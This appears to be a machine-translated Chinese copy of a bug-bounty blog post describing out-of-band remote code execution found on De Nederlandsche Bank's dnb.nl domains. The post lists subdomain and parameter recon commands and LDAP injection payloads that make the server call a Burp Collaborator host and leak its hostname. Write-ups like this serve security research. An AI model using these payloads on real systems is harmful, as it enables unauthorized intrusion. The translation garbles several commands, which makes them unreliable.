<html>
<head>
<title>Out-Of-Bond Remote code Execution(RCE) on De Nederlandsche Bank N.V. with burp-suite collaborator</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">与burp-suite合作者在荷兰银行(RCE)进行债券外远程代码执行</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/out-of-bond-remote-code-execution-rce-on-de-nederlandsche-bank-n-v-with-burp-suite-collaborator-2ce50260e2e4?source=collection_archive---------0-----------------------#2022-08-28">https://infosecwriteups.com/out-of-bond-remote-code-execution-rce-on-de-nederlandsche-bank-n-v-with-burp-suite-collaborator-2ce50260e2e4?source=collection_archive---------0-----------------------#2022-08-28</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="cf01" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">大家好</p><p id="0c84" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我叫Santosh Kumar Sha，是一名来自印度(阿萨姆邦)的安全研究员/职业黑客。在本文中，我将描述我是如何在荷兰银行N.V .上使用burp-suite collaborator发现非绑定远程代码执行(RCE)的</p><blockquote class="kl km kn"><p id="8e89" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir">我现在提供一对一的会议来分享我的知识和专长:</strong></p><p id="a0f6" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><a class="ae ks" href="https://topmate.io/santosh_kumar_sha" rel="noopener ugc nofollow" target="_blank">T3【topmate.io/santosh_kumar_sha】T5</a></p></blockquote><h1 id="bf0d" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">特别说明:</h1><p id="c944" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">未经允许，不要走出测试范围。保持安全，也黑客安全。特别请求我的昆虫赏金猎人同伴，保重你的健康，永远遵守交战规则。</p><p id="2fa8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">用于开发的工具</strong></p><p id="241e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">1.子查找器(https://github.com/projectdiscovery/subfinder)</p><p id="bafd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2.httpx(https://github.com/projectdiscovery/httpx)</p><p id="144b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">3.高(科尔本)——<a class="ae ks" href="https://github.com/lc/gau" rel="noopener ugc nofollow" target="_blank">https://github.com/lc/gau</a></p><p id="120c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">4.waybackurls(汤姆诺姆)——<a class="ae ks" href="https://github.com/tomnomnom/waybackurls" rel="noopener ugc nofollow" target="_blank">https://github.com/tomnomnom/waybackurls</a>。</p><p id="d7bb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">5.https://portswigger.net/burp</p><h1 id="a9bd" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">bug背后的故事:</h1><p id="5bec" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">这是我的如何在荷兰银行N.V .上发现债券外远程代码执行(RCE)的书面报告。burp-suite collaborator同时在不同的域上使用模糊参数。因此，在随意浏览和探索主域时，我注意到一个端点正在接受输入，因此输入一个有效载荷，但由于waf，在服务器上执行命令并不简单。</p><h1 id="f33d" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">这是这样的:</h1><p id="90b2" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">假设我们假设目标名称是dnb.nl，其中所有内容都在范围内，如下所示:</p><p id="5827" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">范围内:*.dnb.nl </strong></p><p id="a824" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了收集互联网档案中的所有子域，我使用了subfinder、waybackurls工具和gau。</p><h1 id="7dd6" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">使用的命令:</h1><p id="09a7" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated"><strong class="jp ir">sub finder-d DNB . nl silent</strong></p><p id="511a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> gau -subs dnb.nl </strong></p><p id="eb95" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> waybackurls dnb.nl </strong></p><p id="7b1d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，错过子域的机会仍然存在，所以为了领先于游戏，我不想错过任何子域进行测试，所以我使用subfinder和管道waybackurls获得所有子域的所有域，如果存在，并将其保存到一个文件。</p><h1 id="81b0" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">因此，最终的命令将如下所示:</h1><p id="41b2" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">gau -subs dnb.nl |展开域&gt; &gt; vul1.txt</p><p id="678b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">waybackurls dnb.nl|展开域&gt; &gt; vul2.txt</p><p id="6fb9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">sub finder-d DNB . nl-silent &gt; &gt; vul 3 . txt</p><p id="cb8f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在收集所有的子域在一个和整理出重复的</p><h1 id="6a82" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">cat vul 1 . txt vul 2 . txt vul 3 . txt | sort-u &gt; &gt; unique _ sub . txt</h1><p id="b8f1" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">因为，如果现在我已经收集了所有的唯一域名，并将其存储在"<strong class="jp ir"> unique_sub.txt </strong>"上</p><h1 id="9291" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">现在创建模糊参数的客户词表:</h1><p id="3496" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">gau-subs<a class="ae ks" href="https://sharefile.dnb.nl" rel="noopener ugc nofollow" target="_blank">DNB . nl</a>| grep " = " | sed ' s/。*.？//' | sed 's/ &amp; /\n/' | sed 's/=。*//' &gt; &gt; param1.txt</p><p id="8e65" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">wayback URLs<a class="ae ks" href="https://sharefile.dnb.nl" rel="noopener ugc nofollow" target="_blank">DNB . nl</a>| grep " = " | sed ' s/。*.？//' | sed 's/ &amp; /\n/' | sed 's/=。*//' | sort-u&gt;&gt;param 2 . txt</p><h1 id="9d0b" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">cat param 1 . txt param 2 . txt | sort-u &gt; &gt; param . txt</h1><p id="9c27" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">因为，如果现在我已经收集了所有独特的参数，并将其存储在<strong class="jp ir">“param . txt”</strong></p><p id="d9da" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我有了唯一的域和模糊化的客户参数。</p><h1 id="a8e0" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">现在真正的狩猎开始了，我是如何摆脱邦德·RCE的:</h1><p id="8433" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">因此，当在打嗝中继器的端点附近播放时，我遇到了一个接受输入的参数，但当我被注入RCE有效载荷时，它被WAF阻止，并且还对很难绕过的特殊字符进行了编码。我尝试了多种编码和解码技术来绕过它，也尝试了多种WAF bypass有效载荷和一些自定义有效载荷，但没有成功。很难绕过waf和编码来触发RCE。</p><p id="bafb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，在尝试了一切之后，我想为什么不尝试脱离绑定远程代码执行来提取后端上运行的命令，并将其聚集在任何其他服务器上以绕过WAF。</p><p id="742e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以，我不需要任何第三方域名或服务器来响应。以下是burp collaborator如何在测试使用时派上用场。我使用了but payload使用curl，ping和nslookup命令使用burp collaborator服务器，但没有成功。但是，突然我想起他们在使用ldap。</p><p id="fc03" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以，我最后把有效载荷试成了<strong class="jp ir">“LDAP://test。&lt;打嗝合作者_服务器&gt; " </strong>幸运的是我收到了dns的pingback。</p><p id="03e1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是为了证明RCE，我决定升级并从服务器获取在服务器上执行的命令的响应。现在，我尝试了最后一个有效负载来获取在服务器上执行的rce命令输出。</p><p id="c346" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> " ldap://${hostname}。&lt;打嗝合作者_服务器&gt;</strong></p><p id="449f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">钻孔过程:</strong></p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi lw"><img src="../Images/07fe888496e60629aa824517ccaf2ee3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nyN4kCwPXsOVAGVJ_mCaCg.png"/></div></div></figure><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mi"><img src="../Images/a377996f893e22331c6186ff87f5364b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4osYouG9ogRchwZk4zoopw.png"/></div></div></figure><p id="6e25" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用这种方法，我能够使用burp-suite入侵者通过burp-suite collaborator执行多个脱离绑定的远程代码执行(RCE)。我在一份报告中报告了所有问题，因为所有问题都是因为相同的根本原因，所以只奖励一次。</p><figure class="lx ly lz ma gt mb gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mj"><img src="../Images/233498306e93ba3804d9bce6aadf844b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lVaZqE-DSZVuq-euQ71n4w.png"/></div></div></figure><h1 id="c32d" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">故事的寓意:</h1><p id="d35f" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">使用burp-suite作为自动化工具，因为它提供了无限的能力，而且你不需要编程知识，你只需要知道如何使用它。</p><p id="1203" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">外卖</strong></p><p id="399f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我敢肯定，许多安全研究人员已经看到了这个过程，但这是我如何在荷兰银行N.V .与burp-suite collaborator上发现非绑定远程代码执行(RCE)的方法。</p><p id="6048" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这也是我想分享我的经历的原因之一。同时强调利用此类漏洞的其他技术。</p><p id="fa78" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">喜欢我的作品就支持我吧！给我买杯咖啡，在T2的推特上关注我。 <br/> <strong class="jp ir">领英简介</strong>:<a class="ae ks" href="https://www.linkedin.com/in/santoshlegend12tech/" rel="noopener ugc nofollow" target="_blank">https://www.linkedin.com/in/santoshlegend12tech/</a></p></div><div class="ab cl mk ml hu mm" role="separator"><span class="mn bw bk mo mp mq"/><span class="mn bw bk mo mp mq"/><span class="mn bw bk mo mp"/></div><div class="ij ik il im in"><p id="b32a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="ko">来自Infosec的报道:每天Infosec上都会出现很多难以跟上的内容。</em> <a class="ae ks" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> <em class="ko">加入我们的每周简讯</em> </strong> </a> <em class="ko">以5篇文章、4个线程、3个视频、2个Github Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</em></p></div></div>    
</body>
</html>